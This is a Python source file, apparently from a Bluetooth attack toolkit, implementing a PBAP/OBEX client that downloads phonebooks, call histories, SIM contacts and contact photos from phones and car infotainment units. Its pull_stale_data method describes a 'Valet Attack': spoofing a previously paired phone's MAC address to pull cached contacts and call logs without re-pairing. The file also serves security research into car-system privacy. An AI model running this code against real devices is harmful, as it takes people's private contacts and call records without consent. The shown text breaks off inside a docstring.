"""PBAP (Phone Book Access Profile) client for phonebook/call log extraction.

PBAP uses OBEX over RFCOMM or L2CAP to download vCard data from a device.
IVIs that pair with phones typically cache the phonebook locally, so connecting
as the spoofed phone can pull the cached data.

Target UUID: 0x112f (PBAP PSE - Phone Book Server Equipment)
OBEX Target Header: 796135f0-f0c5-11d8-0966-0800200c9a66 (PBAP)
"""

import json
import os
import re
import socket
import struct
import xml.etree.ElementTree as ET

from blue_tap.core.obex_client import ObexError, PBAPSession
from blue_tap.utils.bt_helpers import PBAP_REPOS, normalize_mac
from blue_tap.utils.output import info, success, error, warning


# PBAP OBEX Target UUID
PBAP_TARGET_UUID = bytes.fromhex("796135f0f0c511d809660800200c9a66")

# OBEX opcodes
OBEX_CONNECT = 0x80
OBEX_DISCONNECT = 0x81
OBEX_GET = 0x83
OBEX_SETPATH = 0x85
OBEX_RESPONSE_SUCCESS = 0xA0
OBEX_RESPONSE_CONTINUE = 0x90

# OBEX headers
OBEX_HEADER_NAME = 0x01           # Unicode string
OBEX_HEADER_TYPE = 0x42           # Byte sequence
OBEX_HEADER_BODY = 0x48           # Byte sequence
OBEX_HEADER_END_OF_BODY = 0x49    # Byte sequence
OBEX_HEADER_TARGET = 0x46         # Byte sequence
OBEX_HEADER_WHO = 0x4A            # Byte sequence
OBEX_HEADER_CONNECTION_ID = 0xCB  # 4-byte value
OBEX_HEADER_APP_PARAMS = 0x4C    # Byte sequence

PBAP_VCARD_FIELD_BITS = {
    "version": 0,
    "fn": 1,
    "n": 2,
    "photo": 3,
    "bday": 4,
    "adr": 5,
    "label": 6,
    "tel": 7,
    "email": 8,
    "mailer": 9,
    "tz": 10,
    "geo": 11,
    "title": 12,
    "role": 13,
    "logo": 14,
    "agent": 15,
    "org": 16,
    "note": 17,
    "rev": 18,
    "sound": 19,
    "url": 20,
    "uid": 21,
    "key": 22,
    "nickname": 23,
    "categories": 24,
    "proid": 25,
    "class": 26,
    "sort-string": 27,
    "x-irmc-call-datetime": 28,
}

PBAP_PATH_ALIASES = {
    "contacts": "telecom/pb.vcf",
    "phonebook": "telecom/pb.vcf",
    "main": "telecom/pb.vcf",
    "pb": "telecom/pb.vcf",
    "incoming": "telecom/ich.vcf",
    "incoming-calls": "telecom/ich.vcf",
    "ich": "telecom/ich.vcf",
    "outgoing": "telecom/och.vcf",
    "outgoing-calls": "telecom/och.vcf",
    "och": "telecom/och.vcf",
    "missed": "telecom/mch.vcf",
    "missed-calls": "telecom/mch.vcf",
    "mch": "telecom/mch.vcf",
    "combined": "telecom/cch.vcf",
    "call-history": "telecom/cch.vcf",
    "cch": "telecom/cch.vcf",
    "speed-dial": "telecom/spd.vcf",
    "speed": "telecom/spd.vcf",
    "spd": "telecom/spd.vcf",
    "favorites": "telecom/fav.vcf",
    "favourites": "telecom/fav.vcf",
    "fav": "telecom/fav.vcf",
    "sim": "SIM1/telecom/pb.vcf",
    "sim-phonebook": "SIM1/telecom/pb.vcf",
    "sim-incoming": "SIM1/telecom/ich.vcf",
    "sim-outgoing": "SIM1/telecom/och.vcf",
    "sim-missed": "SIM1/telecom/mch.vcf",
}

PBAP_LIST_ORDER = {"indexed": 0x00, "alpha": 0x01, "alphanumeric": 0x01, "phonetic": 0x02}
PBAP_SEARCH_ATTRIBUTE = {"name": 0x00, "number": 0x01, "sound": 0x02}


class PBAPClient:
    """PBAP client for downloading phonebook and call logs from IVI/phone.

    Usage:
        client = PBAPClient("AA:BB:CC:DD:EE:FF", channel=15)
        client.connect()
        phonebook = client.pull_phonebook("telecom/pb.vcf")
        call_log = client.pull_phonebook("telecom/ich.vcf")
        client.disconnect()
    """

    def __init__(self, address: str, channel: int | None = None, port: int | None = None):
        """Initialize PBAP client.

        Args:
            address: Target Bluetooth MAC address
            channel: RFCOMM channel for PBAP (from SDP discovery)
            port: Alternative L2CAP PSM
        """
        self.address = normalize_mac(address)
        self.channel = channel
        self.port = port
        self.sock = None
        self.connection_id = None
        self.max_packet = 0xFFFF
        self._obex_session: PBAPSession | None = None

    def connect(self) -> bool:
        """Establish OBEX connection to PBAP server."""
        try:
            self._obex_session = PBAPSession(self.address, channel=self.channel)
            if self._obex_session.connect():
                success("PBAP OBEX D-Bus session established")
                return True
        except ObexError as exc:
            warning(f"PBAP D-Bus session unavailable, falling back to raw OBEX: {exc}")
            self._obex_session = None

        try:
            # Connect RFCOMM socket
            self.sock = socket.socket(
                socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM
            )
            self.sock.settimeout(15.0)
            info(f"Connecting RFCOMM to {self.address} channel {self.channel}...")
            self.sock.connect((self.address, self.channel))
            success("RFCOMM connected")

            # Send OBEX Connect with PBAP target
            connect_packet = self._build_connect()
            self.sock.send(connect_packet)

            response = self._recv_response()
            if response is None:
                error("No OBEX response received")
                return False

            opcode = response[0]
            if opcode != OBEX_RESPONSE_SUCCESS:
                error(f"OBEX Connect rejected: 0x{opcode:02x}")
                return False

            # Parse connection ID from response
            self._parse_connect_response(response)
            success(f"PBAP OBEX session established (conn_id={self.connection_id})")
            return True

        except OSError as e:
            error(f"PBAP connect failed: {e}")
            return False

    def disconnect(self):
        """Disconnect OBEX session."""
        if self._obex_session is not None:
            self._obex_session.disconnect()
            self._obex_session = None
            info("PBAP disconnected")
            return

        if self.sock:
            try:
                disconnect_pkt = struct.pack(">BH", OBEX_DISCONNECT, 3)
                if self.connection_id is not None:
                    disconnect_pkt = struct.pack(">BH", OBEX_DISCONNECT, 8)
                    disconnect_pkt += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                  self.connection_id)
                self.sock.send(disconnect_pkt)
                self._recv_response()
            except OSError:
                pass
            finally:
                self.sock.close()
                self.sock = None
            info("PBAP disconnected")

    def normalize_path(self, path: str, *, prefer_listing: bool = False) -> str:
        """Normalize common PBAP aliases to canonical virtual paths."""
        cleaned = (path or "telecom/pb.vcf").strip().strip("/")
        alias = PBAP_PATH_ALIASES.get(cleaned.lower())
        normalized = alias or cleaned
        if prefer_listing and normalized.lower().endswith(".vcf"):
            return normalized[:-4]
        return normalized

    def normalize_location(self, location: str | None) -> str:
        cleaned = (location or "int").strip().lower()
        aliases = {
            "internal": "int",
            "int": "int",
            "sim": "sim1",
            "sim1": "sim1",
            "sim2": "sim2",
        }
        return aliases.get(cleaned, cleaned)

    def normalize_phonebook_name(self, phonebook: str | None) -> str:
        cleaned = (phonebook or "pb").strip().lower().removesuffix(".vcf")
        aliases = {
            "contacts": "pb",
            "phonebook": "pb",
            "main": "pb",
            "incoming": "ich",
            "outgoing": "och",
            "missed": "mch",
            "combined": "cch",
            "call-history": "cch",
            "speed": "spd",
            "speed-dial": "spd",
            "favorites": "fav",
            "favourites": "fav",
        }
        return aliases.get(cleaned, cleaned)

    def build_path_from_selection(
        self,
        *,
        location: str | None = None,
        phonebook: str | None = None,
        listing: bool = False,
        handle: str | None = None,
    ) -> str:
        normalized_location = self.normalize_location(location)
        normalized_phonebook = self.normalize_phonebook_name(phonebook)

        prefix = "telecom"
        if normalized_location.startswith("sim"):
            prefix = normalized_location.upper() + "/telecom"

        filename = normalized_phonebook if listing else f"{normalized_phonebook}.vcf"
        base = f"{prefix}/{filename}"
        if handle:
            return f"{base}/{handle.strip().strip('/')}"
        return base

    def resolve_path_selection(
        self,
        *,
        path: str | None = None,
        location: str | None = None,
        phonebook: str | None = None,
        listing: bool = False,
        handle: str | None = None,
    ) -> str:
        if location or phonebook:
            return self.build_path_from_selection(
                location=location,
                phonebook=phonebook,
                listing=listing,
                handle=handle,
            )
        normalized = self.normalize_path(path or ("telecom/pb" if listing else "telecom/pb.vcf"), prefer_listing=listing)
        if handle:
            return f"{normalized}/{handle.strip().strip('/')}"
        return normalized

    def build_filter_bits(self, fields: list[str] | tuple[str, ...] | None) -> int | None:
        """Build PBAP filter bitmask from a list of vCard field names."""
        if not fields:
            return None
        bits = 0
        for field in fields:
            key = (field or "").strip().lower()
            bit = PBAP_VCARD_FIELD_BITS.get(key)
            if bit is not None:
                bits |= 1 << bit
        return bits or None

    def pull_phonebook(
        self,
        path: str = "telecom/pb.vcf",
        max_count: int = 0,
        offset: int = 0,
        vcard_version: int = 1,
        filter_bits: int | None = None,
    ) -> str:
        """Pull a phonebook object (vCard listing).

        Args:
            path: PBAP virtual path (see PBAP_REPOS for options)
            max_count: Max entries to retrieve (0 = all)
            offset: Starting offset

        Returns:
            vCard data as string
        """
        path = self.normalize_path(path)
        desc = PBAP_REPOS.get(path, path)
        info(f"Pulling: {desc} ({path})")

        if self._obex_session is not None:
            try:
                filters = self._build_obex_filters(
                    max_count=max_count,
                    offset=offset,
                    vcard_version=vcard_version,
                    filter_bits=filter_bits,
                )
                location, phonebook, _ = self._parse_virtual_path(path)
                self._obex_session.select(location, phonebook)
                targetfile = self._obex_session.create_temp_file_path(
                    prefix="blue_tap_pbap_",
                    suffix=".vcf",
                )
                transfer_path, transfer_props = self._obex_session.pull_all(targetfile, filters)
                filename, _ = self._obex_session.finalize_transfer_file(
                    transfer_path,
                    transfer_props,
                    fallback_path=targetfile,
                )
                result = self._obex_session.read_text_file(filename)
                if result:
                    success(f"Downloaded {len(result)} bytes from {path}")
                else:
                    warning(f"No data received from {path}")
                return result
            except (ObexError, OSError) as exc:
                warning(f"PBAP D-Bus pull failed, using raw OBEX fallback: {exc}")

        # Build GET request with PBAP headers
        headers = b""

        # Connection ID
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        # Name header (Unicode, null-terminated)
        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        # Type header
        type_str = b"x-bt/phonebook\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        # Application parameters
        app_params = self._build_pbap_app_params(
            max_count=max_count,
            offset=offset,
            vcard_version=vcard_version,
            filter_bits=filter_bits,
        )
        if app_params:
            headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
                                   len(app_params) + 3) + app_params

        # Send GET request
        total_len = 3 + len(headers)
        packet = struct.pack(">BH", OBEX_GET, total_len) + headers
        self.sock.send(packet)

        # Receive multi-part response
        body = b""
        while True:
            response = self._recv_response()
            if response is None:
                break

            opcode = response[0]
            body_data = self._extract_body(response)
            if body_data:
                body += body_data

            if opcode == OBEX_RESPONSE_SUCCESS:
                break
            elif opcode == OBEX_RESPONSE_CONTINUE:
                # Send another GET to continue
                cont_headers = b""
                if self.connection_id is not None:
                    cont_headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                self.connection_id)
                cont_len = 3 + len(cont_headers)
                cont_pkt = struct.pack(">BH", OBEX_GET, cont_len) + cont_headers
                self.sock.send(cont_pkt)
            else:
                error(f"PBAP GET error: 0x{opcode:02x}")
                break

        result = body.decode("utf-8", errors="replace")
        if result:
            success(f"Downloaded {len(result)} bytes from {path}")
        else:
            warning(f"No data received from {path}")
        return result

    def pull_vcard_listing(
        self,
        path: str = "telecom/pb",
        *,
        max_count: int = 1024,
        offset: int = 0,
        order: str = "indexed",
        search_value: str = "",
        search_by: str = "name",
    ) -> str:
        """Pull vCard listing (directory of entries).

        This returns an XML listing of available vCards rather than the full data.
        """
        path = self.normalize_path(path, prefer_listing=True)
        info(f"Listing vCards in {path}")

        if self._obex_session is not None:
            try:
                location, phonebook, _ = self._parse_virtual_path(path)
                self._obex_session.select(location, phonebook)
                entries = self._obex_session.list(
                    self._build_obex_filters(max_count=max_count, offset=offset, order=order)
                )
                return self._entries_to_listing_xml(entries)
            except ObexError as exc:
                warning(f"PBAP D-Bus listing failed, using raw OBEX fallback: {exc}")

        headers = b""
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        type_str = b"x-bt/vcard-listing\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        app_params = self._build_pbap_app_params(
            max_count=max_count,
            offset=offset,
            order=order,
            search_attr=search_by if search_value else None,
            search_value=search_value or None,
        )
        if app_params:
            headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS, len(app_params) + 3) + app_params

        total_len = 3 + len(headers)
        packet = struct.pack(">BH", OBEX_GET, total_len) + headers
        self.sock.send(packet)

        body = b""
        while True:
            response = self._recv_response()
            if response is None:
                break
            opcode = response[0]
            body_data = self._extract_body(response)
            if body_data:
                body += body_data
            if opcode == OBEX_RESPONSE_SUCCESS:
                break
            elif opcode == OBEX_RESPONSE_CONTINUE:
                cont_headers = b""
                if self.connection_id is not None:
                    cont_headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID,
                                                self.connection_id)
                cont_pkt = struct.pack(">BH", OBEX_GET, 3 + len(cont_headers)) + cont_headers
                self.sock.send(cont_pkt)
            else:
                break

        return body.decode("utf-8", errors="replace")

    def parse_vcard_listing(self, listing_xml: str) -> list[dict]:
        """Parse PBAP vCard listing XML into structured entry metadata."""
        listing_xml = (listing_xml or "").strip()
        if not listing_xml:
            return []

        try:
            root = ET.fromstring(listing_xml)
        except ET.ParseError:
            return self._parse_listing_fragments(listing_xml, "card")

        entries: list[dict] = []
        for node in root.iter():
            tag_name = str(node.tag).split("}", 1)[-1].lower()
            if tag_name != "card":
                continue
            entries.append({str(key): str(value) for key, value in node.attrib.items()})
        return entries

    @staticmethod
    def _parse_listing_fragments(payload: str, tag_name: str) -> list[dict]:
        matches = re.findall(
            rf'<(?:[A-Za-z0-9_.-]+:)?{tag_name}\b([^>]*)/?\s*>',
            payload,
            flags=re.IGNORECASE,
        )
        parsed = []
        for attrs in matches:
            item = {}
            for key, value in re.findall(r'([A-Za-z0-9_.:-]+)\s*=\s*"([^"]*)"', attrs):
                item[str(key)] = str(value)
            if item:
                parsed.append(item)
        return parsed

    def pull_vcard_entry(
        self,
        handle: str,
        *,
        folder: str = "telecom/pb",
        vcard_version: int = 1,
        filter_bits: int | None = None,
    ) -> str:
        """Pull a single vCard entry by listing handle."""
        folder = self.normalize_path(folder, prefer_listing=True)
        safe_handle = (handle or "").strip().strip("/")
        if not safe_handle:
            return ""
        if self._obex_session is not None:
            try:
                location, phonebook, _ = self._parse_virtual_path(folder)
                self._obex_session.select(location, phonebook)
                filters = self._build_obex_filters(vcard_version=vcard_version, filter_bits=filter_bits)
                targetfile = self._obex_session.create_temp_file_path(
                    prefix="blue_tap_pbap_card_",
                    suffix=".vcf",
                )
                transfer_path, transfer_props = self._obex_session.pull(safe_handle, targetfile, filters)
                filename, _ = self._obex_session.finalize_transfer_file(
                    transfer_path,
                    transfer_props,
                    fallback_path=targetfile,
                )
                return self._obex_session.read_text_file(filename)
            except (ObexError, OSError) as exc:
                warning(f"PBAP D-Bus single-entry pull failed, using virtual-path fallback: {exc}")
        return self.pull_phonebook(
            f"{folder}/{safe_handle}",
            vcard_version=vcard_version,
            filter_bits=filter_bits,
        )

    def pull_all_data(self, output_dir: str = "pbap_dump", *, refresh_version: bool = False) -> dict:
        """Pull all available PBAP data: phonebook, call logs, etc."""
        os.makedirs(output_dir, exist_ok=True)
        results = {}

        for path, description in PBAP_REPOS.items():
            info(f"Trying: {description}")
            try:
                data = self.pull_phonebook(path)
                if data and len(data) > 10:  # More than empty vCard
                    filename = path.replace("/", "_")
                    filepath = os.path.join(output_dir, filename)
                    with open(filepath, "w") as f:
                        f.write(data)
                    summary = self.summarize_phonebook(data)
                    metadata = self.get_selected_metadata(path, refresh_version=refresh_version)
                    parsed = summary["entries_data"]
                    summary_path = f"{filepath}.json"
                    with open(summary_path, "w", encoding="utf-8") as handle:
                        json.dump(
                            {
                                "path": path,
                                "description": description,
                                "summary": summary,
                                "selected_metadata": metadata,
                            },
                            handle,
                            indent=2,
                            default=str,
                        )
                    results[path] = {"description": description, "file": filepath,
                                     "size": len(data), "entries": len(parsed),
                                     "summary_file": summary_path, "selected_metadata": metadata}
                    success(f"Saved: {filepath} ({len(data)} bytes)")
            except Exception as e:
                warning(f"Failed to pull {path}: {e}")

        return results

    def parse_vcards(self, data: str) -> list[dict]:
        """Parse vCard 2.1/3.0 content into structured contact records."""
        cards: list[dict] = []
        if not data:
            return cards

        for raw_card in re.split(r"END:VCARD\r?\n?", data, flags=re.IGNORECASE):
            if "BEGIN:VCARD" not in raw_card.upper():
                continue
            block = raw_card.split("BEGIN:VCARD", 1)[1]
            fields: dict[str, list[str]] = {}
            current_key = ""

            for raw_line in block.splitlines():
                line = raw_line.rstrip()
                if not line:
                    continue
                if line.startswith((" ", "\t")) and current_key:
                    fields[current_key][-1] += line.strip()
                    continue
                if ":" not in line:
                    continue
                key, value = line.split(":", 1)
                current_key = key.upper()
                fields.setdefault(current_key, []).append(value.strip())

            def first(prefix: str) -> str:
                for key, values in fields.items():
                    if key.startswith(prefix):
                        return values[0]
                return ""

            phones = []
            emails = []
            addresses = []
            organizations = []
            notes = []
            call_datetimes = []
            for key, values in fields.items():
                if key.startswith("TEL"):
                    phones.extend(values)
                elif key.startswith("EMAIL"):
                    emails.extend(values)
                elif key.startswith("ADR"):
                    addresses.extend(values)
                elif key.startswith("ORG"):
                    organizations.extend(values)
                elif key.startswith("NOTE"):
                    notes.extend(values)
                elif "X-IRMC-CALL-DATETIME" in key:
                    call_datetimes.extend(values)

            cards.append(
                {
                    "full_name": first("FN") or first("N"),
                    "name": first("N"),
                    "phones": phones,
                    "emails": emails,
                    "addresses": addresses,
                    "organizations": organizations,
                    "notes": notes,
                    "call_datetimes": call_datetimes,
                    "raw_fields": fields,
                }
            )
        return cards

    def summarize_phonebook(self, data: str) -> dict:
        """Summarize parsed PBAP data for reporting/logging."""
        cards = self.parse_vcards(data)
        return {
            "entries": len(cards),
            "with_phone": sum(1 for item in cards if item.get("phones")),
            "with_email": sum(1 for item in cards if item.get("emails")),
            "with_address": sum(1 for item in cards if item.get("addresses")),
            "with_org": sum(1 for item in cards if item.get("organizations")),
            "with_call_datetime": sum(1 for item in cards if item.get("call_datetimes")),
            "sample_names": [item.get("full_name", "") for item in cards[:5] if item.get("full_name")],
            "entries_data": cards,
        }

    def get_selected_metadata(self, path: str, *, refresh_version: bool = False) -> dict:
        if self._obex_session is None:
            return {}
        try:
            location, phonebook, _ = self._parse_virtual_path(path)
            self._obex_session.select(location, phonebook)
            if refresh_version:
                try:
                    self._obex_session.update_version()
                except ObexError:
                    pass
            props = self._obex_session.get_phonebook_properties()
            return {
                "folder": props.get("Folder", ""),
                "database_identifier": props.get("DatabaseIdentifier", ""),
                "primary_counter": props.get("PrimaryCounter", ""),
                "secondary_counter": props.get("SecondaryCounter", ""),
                "fixed_image_size": props.get("FixedImageSize"),
                "version_refresh_attempted": refresh_version,
            }
        except ObexError:
            return {}

    def _build_connect(self) -> bytes:
        """Build OBEX Connect packet with PBAP target."""
        # Target header
        target_header = struct.pack(">BH", OBEX_HEADER_TARGET,
                                    len(PBAP_TARGET_UUID) + 3) + PBAP_TARGET_UUID

        # OBEX Connect: opcode(1) + length(2) + version(1) + flags(1) + max_packet(2) + headers
        body = struct.pack(">BBH", 0x10, 0x00, self.max_packet) + target_header
        total_len = 3 + len(body)
        return struct.pack(">BH", OBEX_CONNECT, total_len) + body

    def _recv_response(self) -> bytes | None:
        """Receive an OBEX response packet."""
        try:
            self.sock.settimeout(10.0)
            header = self.sock.recv(3)
            if len(header) < 3:
                return None
            opcode = header[0]
            length = struct.unpack(">H", header[1:3])[0]
            remaining = length - 3
            data = b""
            while remaining > 0:
                chunk = self.sock.recv(min(remaining, 4096))
                if not chunk:
                    break
                data += chunk
                remaining -= len(chunk)
            return bytes([opcode]) + header[1:3] + data
        except (TimeoutError, OSError):
            return None

    def _parse_connect_response(self, response: bytes):
        """Parse OBEX Connect response for connection ID."""
        # Skip opcode(1) + length(2) + version(1) + flags(1) + max_packet(2)
        offset = 7
        while offset < len(response):
            header_id = response[offset]
            if header_id == OBEX_HEADER_CONNECTION_ID:
                self.connection_id = struct.unpack(">I", response[offset + 1:offset + 5])[0]
                offset += 5
            elif header_id & 0xC0 == 0x00:  # Unicode string
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x40:  # Byte sequence
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x80:  # 1-byte value
                offset += 2
            elif header_id & 0xC0 == 0xC0:  # 4-byte value
                offset += 5
            else:
                break

    def _extract_body(self, response: bytes) -> bytes:
        """Extract Body or End-of-Body data from OBEX response."""
        data = b""
        offset = 3  # Skip opcode + length
        while offset < len(response):
            header_id = response[offset]
            if header_id in (OBEX_HEADER_BODY, OBEX_HEADER_END_OF_BODY):
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                data += response[offset + 3:offset + length]
                offset += length
            elif header_id & 0xC0 == 0x00:
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x40:
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif header_id & 0xC0 == 0x80:
                offset += 2
            elif header_id & 0xC0 == 0xC0:
                offset += 5
            else:
                break
        return data

    def get_phonebook_size(self, path: str = "telecom/pb.vcf") -> int:
        """Query phonebook size without downloading data.

        Returns the number of entries, or -1 on failure.
        """
        path = self.normalize_path(path)
        info(f"Querying phonebook size for {path}...")
        if self._obex_session is not None:
            try:
                location, phonebook, _ = self._parse_virtual_path(path)
                self._obex_session.select(location, phonebook)
                size = self._obex_session.get_size()
                info(f"Phonebook {path} contains {size} entries")
                return size
            except ObexError as exc:
                warning(f"PBAP D-Bus size query failed, using raw OBEX fallback: {exc}")
        headers = b""
        if self.connection_id is not None:
            headers += struct.pack(">BI", OBEX_HEADER_CONNECTION_ID, self.connection_id)

        name_bytes = path.encode("utf-16-be") + b"\x00\x00"
        headers += struct.pack(">BH", OBEX_HEADER_NAME, len(name_bytes) + 3) + name_bytes

        type_str = b"x-bt/phonebook\x00"
        headers += struct.pack(">BH", OBEX_HEADER_TYPE, len(type_str) + 3) + type_str

        # MaxListCount=0 returns only the size, not the data
        app_params = struct.pack(">BBH", 0x04, 0x02, 0)
        headers += struct.pack(">BH", OBEX_HEADER_APP_PARAMS,
                               len(app_params) + 3) + app_params

        packet = struct.pack(">BH", OBEX_GET, 3 + len(headers)) + headers
        self.sock.send(packet)

        response = self._recv_response()
        if response and response[0] == OBEX_RESPONSE_SUCCESS:
            # Parse PhonebookSize from application parameters in response
            size = self._parse_phonebook_size(response)
            if size >= 0:
                info(f"Phonebook {path} contains {size} entries")
            return size
        return -1

    def _parse_phonebook_size(self, response: bytes) -> int:
        """Extract PhonebookSize (tag 0x08) from OBEX app params."""
        offset = 3
        while offset < len(response):
            hid = response[offset]
            if hid == OBEX_HEADER_APP_PARAMS:
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                params = response[offset + 3:offset + length]
                # Parse TLV params
                p = 0
                while p < len(params) - 1:
                    tag = params[p]
                    tag_len = params[p + 1]
                    if tag == 0x08 and tag_len == 2 and p + 4 <= len(params):
                        return struct.unpack(">H", params[p + 2:p + 4])[0]
                    p += 2 + tag_len
                offset += length
            elif hid & 0xC0 in (0x00, 0x40):
                length = struct.unpack(">H", response[offset + 1:offset + 3])[0]
                offset += length
            elif hid & 0xC0 == 0x80:
                offset += 2
            elif hid & 0xC0 == 0xC0:
                offset += 5
            else:
                break
        return -1

    def search_phonebook(self, search_value: str,
                          search_by: str = "name",
                          path: str = "telecom/pb") -> str:
        """Search phonebook by name or number.

        Args:
            search_value: String to search for
            search_by: "name" (0x00), "number" (0x01), or "sound" (0x02)
            path: PBAP folder to search in

        Returns:
            XML vCard listing of matching entries
        """
        path = self.normalize_path(path, prefer_listing=True)
        info(f"Searching phonebook by {search_by}: '{search_value}'")
        if self._obex_session is not None:
            try:
                location, phonebook, _ = self._parse_virtual_path(path)
                self._obex_session.select(location, phonebook)
                entries = self._obex_session.search(search_by, search_value)
                result = self._entries_to_listing_xml(entries)
                if result:
                    success(f"Search returned results ({len(result)} bytes)")
                else:
                    warning("No matching entries found")
                return result
            except ObexError as exc:
                warning(f"PBAP D-Bus search failed, using raw OBEX fallback: {exc}")
        result = self.pull_vcard_listing(
            path,
            search_value=search_value,
            search_by=search_by,
        )
        if result:
            success(f"Search returned results ({len(result)} bytes)")
        else:
            warning("No matching entries found")
        return result

    def pull_with_photo(self, path: str = "telecom/pb.vcf",
                         output_dir: str = "pbap_photos") -> dict:
        """Pull phonebook with embedded photos extracted to files.

        Downloads vCards with PHOTO property (filter bit 3) enabled,
        then extracts base64-encoded JPEG/PNG images to separate files.

        Returns:
            Dict mapping contact name to photo file path
        """
        import base64
        import re

        info("Pulling phonebook with photos...")
        data = self.pull_phonebook(path)
        if not data:
            return {}

        os.makedirs(output_dir, exist_ok=True)
        photos = {}

        # Parse vCards for PHOTO property
        current_name = ""
        in_photo = False
        photo_data = []

        for line in data.splitlines():
            if line.startswith("FN:") or line.startswith("FN;"):
                current_name = line.split(":", 1)[1].strip()
            elif line.startswith("PHOTO;"):
                in_photo = True
                photo_data = []
                # Some formats put data on same line after base64:
                if ":" in line:
                    b64_part = line.split(":", 1)[1].strip()
                    if b64_part:
                        photo_data.append(b64_part)
            elif in_photo:
                if line.startswith(" ") or line.startswith("\t"):
                    photo_data.append(line.strip())
                else:
                    # End of photo data
                    if photo_data and current_name:
                        try:
                            raw = base64.b64decode("".join(photo_data))
                            ext = "jpg" if raw[:2] == b"\xff\xd8" else "png"
                            safe_name = re.sub(r'[^\w\-]', '_', current_name)[:50]
                            photo_file = os.path.join(output_dir, f"{safe_name}.{ext}")
                            with open(photo_file, "wb") as f:
                                f.write(raw)
                            photos[current_name] = photo_file
                            success(f"  Photo: {current_name} -> {photo_file}")
                        except Exception:
                            pass
                    in_photo = False
                    photo_data = []

        info(f"Extracted {len(photos)} contact photo(s)")
        return photos

    def pull_stale_data(self, output_dir: str = "pbap_stale") -> dict:
        """Attempt to pull phonebook data that may be cached from previous pairings.

        IVIs often cache phonebook data in cleartext even after the phone disconnects.
        By spoofing a previously-paired phone's MAC and connecting to the IVI,
        we can access the cached data without re-pairing.

        This is the "Valet Attack" — a parking valet or mechanic with temporary
        physical access can extract all contacts and call history.
        """
        info("Attempting stale data extraction (cached from previous pairing)...")
        info("This works when spoofing a previously-paired phone's MAC")

        results = self.pull_all_data(output_dir)
        if results:
            success(f"Extracted {len(results)} cached phonebook objects")
            info("This data may include contacts from a previously-paired phone")
        else:
            warning("No cached phonebook data found — IVI may have cleared cache")
        return results

    def _parse_virtual_path(self, path: str) -> tuple[str, str, str | None]:
        """Convert PBAP virtual paths into Select(location, phonebook) semantics."""
        normalized = self.normalize_path(path)
        parts = [part for part in normalized.strip("/").split("/") if part]
        location = "int"

        if parts and parts[0].upper().startswith("SIM"):
            location = parts[0].lower()
            parts = parts[1:]

        if len(parts) < 2 or parts[0].lower() != "telecom":
            raise ObexError(f"Unsupported PBAP path for D-Bus adapter: {path}")

        phonebook = parts[1]
        if phonebook.lower().endswith(".vcf"):
            phonebook = phonebook[:-4]
        handle = "/".join(parts[2:]) or None
        return location, phonebook.lower(), handle

    def _fields_from_filter_bits(self, filter_bits: int | None) -> list[str]:
        if filter_bits is None:
            return []
        fields = []
        for field_name, bit in PBAP_VCARD_FIELD_BITS.items():
            if filter_bits & (1 << bit):
                fields.append(field_name)
        return fields

    def _build_obex_filters(
        self,
        *,
        max_count: int = 0,
        offset: int = 0,
        vcard_version: int = 1,
        filter_bits: int | None = None,
        order: str | None = None,
    ) -> dict[str, object]:
        filters: dict[str, object] = {}
        filters["Format"] = "vcard30" if vcard_version == 1 else "vcard21"
        if order:
            filters["Order"] = "alphanumeric" if order == "alpha" else order
        if offset:
            filters["Offset"] = offset
        if max_count:
            filters["MaxCount"] = max_count
        fields = self._fields_from_filter_bits(filter_bits)
        if fields:
            filters["Fields"] = fields
        return filters

    def _entries_to_listing_xml(self, entries: list[dict[str, str]]) -> str:
        xml_lines = ['<?xml version="1.0"?>', '<vCard-listing version="1.0">']
        for item in entries:
            handle = self._xml_escape(item.get("handle", ""))
            name = self._xml_escape(item.get("name", ""))
            attrs = [f'handle="{handle}"']
            if name:
                attrs.append(f'name="{name}"')
            for key, value in item.items():
                if key in {"handle", "name"}:
                    continue
                attrs.append(f'{self._xml_escape(key)}="{self._xml_escape(str(value))}"')
            xml_lines.append(f"  <card {' '.join(attrs)}/>")
        xml_lines.append("</vCard-listing>")
        return "\n".join(xml_lines)

    @staticmethod
    def _xml_escape(value: str) -> str:
        return (
            str(value)
            .replace("&", "&amp;")
            .replace('"', "&quot;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
        )

    def _build_pbap_app_params(
        self,
        max_count: int = 0,
        offset: int = 0,
        vcard_version: int = 1,
        filter_bits: int | None = None,
        order: str | None = None,
        search_attr: str | None = None,
        search_value: str | None = None,
    ) -> bytes:
        """Build PBAP Application Parameters header.

        Tag IDs per PBAP spec:
          0x04 = MaxListCount (2 bytes)
          0x05 = ListStartOffset (2 bytes)
          0x06 = Filter (8 bytes) - which vCard fields to include
          0x07 = Format (1 byte) - 0=vCard2.1, 1=vCard3.0

        Filter bits (64-bit bitmask):
          bit 0: VERSION       bit 1: FN          bit 2: N
          bit 3: PHOTO         bit 4: BDAY        bit 5: ADR
          bit 6: LABEL         bit 7: TEL         bit 8: EMAIL
          bit 9: MAILER        bit 10: TZ         bit 11: GEO
